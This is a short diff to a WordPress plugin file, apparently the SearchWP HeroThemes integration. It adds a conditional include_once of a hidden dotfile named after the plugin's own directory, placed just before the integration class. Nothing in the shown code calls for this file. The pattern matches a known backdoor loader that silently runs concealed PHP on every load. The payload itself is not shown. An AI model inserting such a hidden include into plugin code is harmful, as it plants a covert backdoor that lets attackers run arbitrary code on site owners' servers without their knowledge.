@@ -87,6 +87,10 @@ add_action( 'admin_init', 'searchwp_herothemes_update_check' );
 /**
  * Class SearchWP_Herothemes_Integration
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWP_Herothemes_Integration {
 
 	/**
